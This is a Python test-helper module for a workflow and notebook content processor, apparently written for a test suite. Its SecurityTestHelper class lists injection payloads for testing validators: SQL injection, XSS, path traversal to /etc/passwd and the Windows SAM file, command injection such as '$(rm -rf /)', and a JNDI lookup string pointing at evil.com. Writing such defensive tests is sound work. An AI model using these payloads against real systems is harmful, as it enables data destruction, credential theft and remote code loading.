"""
Test helper functions and utilities for warp-content-processor tests.
"""

import json
import logging
import os
import tempfile
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Dict, Generator, List, Optional, Union
from unittest.mock import Mock, patch

import yaml


def create_temp_file(content: str, suffix: str = ".txt") -> Generator[Path, None, None]:
    """Create a temporary file with the given content."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=suffix, delete=False) as f:
        f.write(content)
        temp_path = Path(f.name)

    try:
        yield temp_path
    finally:
        if temp_path.exists():
            temp_path.unlink()


def create_temp_yaml_file(data: Dict[str, Any]) -> Generator[Path, None, None]:
    """Create a temporary YAML file with the given data."""
    yaml_content = yaml.dump(data, default_flow_style=False)
    with create_temp_file(yaml_content, ".yaml") as temp_path:
        yield temp_path


def create_temp_json_file(data: Dict[str, Any]) -> Generator[Path, None, None]:
    """Create a temporary JSON file with the given data."""
    json_content = json.dumps(data, indent=2)
    with create_temp_file(json_content, ".json") as temp_path:
        yield temp_path


def load_test_data(filename: str) -> Any:
    """Load test data from the fixtures directory."""
    fixtures_dir = Path(__file__).parent.parent / "fixtures"
    file_path = fixtures_dir / filename

    if not file_path.exists():
        raise FileNotFoundError(f"Test data file not found: {file_path}")

    if file_path.suffix in [".yaml", ".yml"]:
        with open(file_path, "r", encoding="utf-8") as f:
            return yaml.safe_load(f)
    elif file_path.suffix == ".json":
        with open(file_path, "r", encoding="utf-8") as f:
            return json.load(f)
    else:
        with open(file_path, "r", encoding="utf-8") as f:
            return f.read()


@contextmanager
def mock_file_operations():
    """Mock file operations for testing."""
    with patch("builtins.open") as mock_open, patch(
        "pathlib.Path.exists"
    ) as mock_exists, patch("pathlib.Path.is_file") as mock_is_file:

        yield {"open": mock_open, "exists": mock_exists, "is_file": mock_is_file}


@contextmanager
def capture_logs(
    logger_name: str = None, level: int = logging.DEBUG
) -> Generator[List[logging.LogRecord], None, None]:
    """Capture log records for testing."""
    logger = logging.getLogger(logger_name) if logger_name else logging.getLogger()

    class LogCapture:
        def __init__(self):
            self.records = []

        def emit(self, record):
            self.records.append(record)

    capture = LogCapture()
    handler = logging.StreamHandler()
    handler.emit = capture.emit
    handler.setLevel(level)

    logger.addHandler(handler)
    original_level = logger.level
    logger.setLevel(level)

    try:
        yield capture.records
    finally:
        logger.removeHandler(handler)
        logger.setLevel(original_level)


class TemporaryTestFile:
    """Context manager for creating temporary test files."""

    def __init__(self, content: str, suffix: str = ".txt"):
        self.content = content
        self.suffix = suffix
        self.path: Optional[Path] = None

    def __enter__(self) -> Path:
        """Create and return the temporary file path."""
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=self.suffix, delete=False
        ) as f:
            f.write(self.content)
            self.path = Path(f.name)
        return self.path

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Clean up the temporary file."""
        if self.path and self.path.exists():
            self.path.unlink()


class MockFileSystem:
    """Mock file system for testing file operations."""

    def __init__(self):
        self.files: Dict[str, str] = {}
        self.directories: List[str] = []

    def add_file(self, path: str, content: str):
        """Add a file to the mock file system."""
        self.files[path] = content

    def add_directory(self, path: str):
        """Add a directory to the mock file system."""
        self.directories.append(path)

    def get_file_content(self, path: str) -> str:
        """Get the content of a file in the mock file system."""
        return self.files.get(path, "")

    def file_exists(self, path: str) -> bool:
        """Check if a file exists in the mock file system."""
        return path in self.files

    def directory_exists(self, path: str) -> bool:
        """Check if a directory exists in the mock file system."""
        return path in self.directories

    @contextmanager
    def patch_file_operations(self):
        """Patch file operations to use the mock file system."""

        def mock_open_func(file_path, mode="r", **kwargs):
            if "r" in mode:
                if file_path in self.files:
                    from io import StringIO

                    return StringIO(self.files[file_path])
                else:
                    raise FileNotFoundError(f"No such file: {file_path}")
            elif "w" in mode:
                from io import StringIO

                mock_file = StringIO()
                original_close = mock_file.close

                def custom_close():
                    self.files[file_path] = mock_file.getvalue()
                    original_close()

                mock_file.close = custom_close
                return mock_file

        def mock_exists(path):
            return str(path) in self.files or str(path) in self.directories

        def mock_is_file(path):
            return str(path) in self.files

        with patch("builtins.open", side_effect=mock_open_func), patch(
            "pathlib.Path.exists", side_effect=mock_exists
        ), patch("pathlib.Path.is_file", side_effect=mock_is_file):
            yield


class TestDataLoader:
    """Helper class for loading and managing test data."""

    def __init__(self, fixtures_dir: Optional[Path] = None):
        self.fixtures_dir = fixtures_dir or (Path(__file__).parent.parent / "fixtures")

    def load_yaml(self, filename: str) -> Any:
        """Load YAML test data."""
        file_path = self.fixtures_dir / filename
        with open(file_path, "r", encoding="utf-8") as f:
            return yaml.safe_load(f)

    def load_json(self, filename: str) -> Any:
        """Load JSON test data."""
        file_path = self.fixtures_dir / filename
        with open(file_path, "r", encoding="utf-8") as f:
            return json.load(f)

    def load_text(self, filename: str) -> str:
        """Load text test data."""
        file_path = self.fixtures_dir / filename
        with open(file_path, "r", encoding="utf-8") as f:
            return f.read()

    def get_sample_workflow(self) -> Dict[str, Any]:
        """Get a sample workflow for testing."""
        return {
            "name": "Test Workflow",
            "description": "A test workflow",
            "command": "echo 'test'",
            "tags": ["test"],
            "shells": ["bash"],
        }

    def get_sample_notebook(self) -> Dict[str, Any]:
        """Get a sample notebook for testing."""
        return {
            "cells": [
                {
                    "cell_type": "code",
                    "source": ["print('Hello, World!')"],
                    "metadata": {},
                    "outputs": [],
                }
            ],
            "metadata": {
                "kernelspec": {
                    "display_name": "Python 3",
                    "language": "python",
                    "name": "python3",
                }
            },
            "nbformat": 4,
            "nbformat_minor": 4,
        }


class SecurityTestHelper:
    """Helper class for security-related testing."""

    MALICIOUS_PAYLOADS = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "$(rm -rf /)",
        "{{7*7}}",
        "${jndi:ldap://evil.com/exploit}",
        "eval(compile('print(1)', '', 'exec'))",
        "__import__('os').system('id')",
    ]

    @staticmethod
    def get_sql_injection_payloads() -> List[str]:
        """Get SQL injection test payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM users; --",
        ]

    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Get XSS test payloads."""
        return [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
        ]

    @staticmethod
    def get_path_traversal_payloads() -> List[str]:
        """Get path traversal test payloads."""
        return [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
        ]

    @staticmethod
    def get_command_injection_payloads() -> List[str]:
        """Get command injection test payloads."""
        return [
            "$(rm -rf /)",
            "; cat /etc/passwd",
            "| id",
            "&& whoami",
        ]


class ValidationTestHelper:
    """Helper class for validation testing."""

    @staticmethod
    def create_valid_test_cases() -> List[Dict[str, Any]]:
        """Create valid test cases for validation testing."""
        return [
            {
                "name": "simple_workflow",
                "data": {
                    "name": "Test",
                    "command": "echo test",
                    "description": "A test workflow",
                },
            },
            {
                "name": "complex_workflow",
                "data": {
                    "name": "Complex Test",
                    "command": "echo test",
                    "description": "A complex test workflow",
                    "tags": ["test", "complex"],
                    "shells": ["bash", "zsh"],
                    "arguments": [
                        {
                            "name": "arg1",
                            "description": "Test argument",
                            "default_value": "default",
                        }
                    ],
                },
            },
        ]

    @staticmethod
    def create_invalid_test_cases() -> List[Dict[str, Any]]:
        """Create invalid test cases for validation testing."""
        return [
            {
                "name": "missing_name",
                "data": {"command": "echo test", "description": "Missing name field"},
            },
            {
                "name": "empty_command",
                "data": {"name": "Test", "command": "", "description": "Empty command"},
            },
            {
                "name": "invalid_type",
                "data": {
                    "name": 123,  # Should be string
                    "command": "echo test",
                    "description": "Invalid name type",
                },
            },
        ]

    @staticmethod
    def create_edge_cases() -> List[Dict[str, Any]]:
        """Create edge case test data."""
        return [
            {
                "name": "very_long_name",
                "data": {
                    "name": "A" * 1000,
                    "command": "echo test",
                    "description": "Very long name",
                },
            },
            {
                "name": "unicode_content",
                "data": {
                    "name": "Unicode Test 世界",
                    "command": "echo 'Hello 世界'",
                    "description": "Unicode content test",
                },
            },
            {
                "name": "special_characters",
                "data": {
                    "name": "Special !@#$%^&*()",
                    "command": "echo 'special chars'",
                    "description": "Special characters test",
                },
            },
        ]


def setup_test_logging(level: int = logging.DEBUG) -> None:
    """Set up logging for tests."""
    logging.basicConfig(
        level=level,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        handlers=[logging.StreamHandler()],
    )


def cleanup_test_files(directory: Path) -> None:
    """Clean up test files in the given directory."""
    if directory.exists() and directory.is_dir():
        for file_path in directory.iterdir():
            if file_path.is_file():
                file_path.unlink()
            elif file_path.is_dir():
                cleanup_test_files(file_path)
                file_path.rmdir()


def get_test_environment_variables() -> Dict[str, str]:
    """Get test-specific environment variables."""
    return {
        "TEST_MODE": "true",
        "LOG_LEVEL": "DEBUG",
        "PYTEST_RUNNING": "true",
        "PYTHONPATH": os.pathsep.join(
            [
                str(Path(__file__).parent.parent.parent / "src"),
                os.environ.get("PYTHONPATH", ""),
            ]
        ),
    }
